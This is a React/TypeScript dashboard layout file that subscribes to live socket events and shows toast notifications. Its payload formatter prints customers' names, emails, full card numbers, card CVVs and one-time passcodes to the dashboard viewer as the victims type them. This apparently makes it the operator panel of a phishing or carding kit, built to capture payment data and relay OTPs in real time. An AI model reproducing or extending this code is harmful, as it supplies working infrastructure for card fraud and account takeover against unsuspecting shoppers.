import { AppSidebar } from '#/components/dashboard/app-sidebar'
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbLink,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from '#/components/ui/breadcrumb'
import { Separator } from '#/components/ui/separator'
import {
  SidebarInset,
  SidebarProvider,
  SidebarTrigger,
} from '#/components/ui/sidebar'
import { getSessionFn } from '#/server/auth-session'
import { createFileRoute, Outlet } from '@tanstack/react-router'
import Layouts from '@/components/Layout'
import { useEffect, useState } from 'react'
import { io } from 'socket.io-client'
import { toast } from 'sonner'
import {
  NotificationDropdown,
  type NotificationItem,
} from '#/components/dashboard/notification-dropdown'

export const Route = createFileRoute('/_dashboard')({
  component: Layout,
  loader: async () => {
    const session = await getSessionFn()

    return { user: session.user }
  },
})

function Layout() {
  const [notifications, setNotifications] = useState<NotificationItem[]>([])

  useEffect(() => {
    if (typeof window === 'undefined') return

    const socketUrl = (import.meta as any).env?.VITE_SOCKET_URL
    if (!socketUrl) return

    const socket = io(socketUrl, {
      transports: ['websocket'],
    })

    const showToast = (
      type: NotificationItem['type'],
      title: string,
      details: string,
    ) => {
      if (type === 'success') {
        toast.success(title, { description: details })
      } else if (type === 'info') {
        toast.info(title, { description: details })
      } else {
        toast(title, { description: details })
      }
    }

    const handlerTypes: Record<string, NotificationItem['type']> = {
      'cart:item-added': 'success',
      'customer:info': 'info',
      'checkout:clicked': 'default',
      'payment:info': 'success',
      'payment:otp': 'success',
    }

    const createHandler =
      (eventName: string, type: NotificationItem['type']) => (data: any) => {
        const title = data?.label || 'New activity'
        const details = formatPayload(data?.payload)

        const nextItem: NotificationItem = {
          id:
            typeof crypto !== 'undefined' && crypto.randomUUID
              ? crypto.randomUUID()
              : `${Date.now()}-${Math.random().toString(16).slice(2)}`,
          title,
          description: details,
          createdAt: new Date().toISOString(),
          type,
          event: eventName,
          read: false,
        }

        setNotifications((prev) => [nextItem, ...prev].slice(0, 30))
        showToast(type, title, details)
      }

    Object.entries(handlerTypes).forEach(([event, type]) => {
      socket.on(event, createHandler(event, type))
    })

    return () => {
      Object.keys(handlerTypes).forEach((event) => socket.off(event))
      socket.disconnect()
    }
  }, [])

  const markAllRead = () =>
    setNotifications((prev) => prev.map((item) => ({ ...item, read: true })))

  const clearNotifications = () => setNotifications([])

  return (
    <SidebarProvider>
      <AppSidebar />
      <SidebarInset>
        <header className="flex h-16 shrink-0 items-center justify-between gap-2 px-4 transition-[width,height] ease-linear group-has-data-[collapsible=icon]/sidebar-wrapper:h-12">
          <div className="flex items-center gap-2">
            <SidebarTrigger className="-ml-1" />
            <Separator
              orientation="vertical"
              className="mr-2 data-[orientation=vertical]:h-4"
            />
            <Breadcrumb>
              <BreadcrumbList>
                <BreadcrumbItem className="hidden md:block">
                  <BreadcrumbLink href="#">
                    Build Your Application
                  </BreadcrumbLink>
                </BreadcrumbItem>
                <BreadcrumbSeparator className="hidden md:block" />
                <BreadcrumbItem>
                  <BreadcrumbPage>Data Fetching</BreadcrumbPage>
                </BreadcrumbItem>
              </BreadcrumbList>
            </Breadcrumb>
          </div>

          <div className="flex items-center gap-2">
            <NotificationDropdown
              notifications={notifications}
              onOpen={markAllRead}
              onClearAll={clearNotifications}
            />
          </div>
        </header>

        <Layouts>
          <Outlet />
        </Layouts>
      </SidebarInset>
    </SidebarProvider>
  )
}

function formatPayload(payload: any) {
  if (!payload || typeof payload !== 'object') return ''

  const map: Record<string, string> = {
    name: '👤 Name',
    email: '📧 Email',
    productId: '📦 Product',
    cardNumber: '💳 Card',
    cardCVV: '🔐 Card CVV',
    otp: '🔢 OTP',
  }

  return Object.entries(payload)
    .map(([key, value]) => {
      const label = map[key] || key
      return `${label}: ${value}`
    })
    .join(' • ')
}
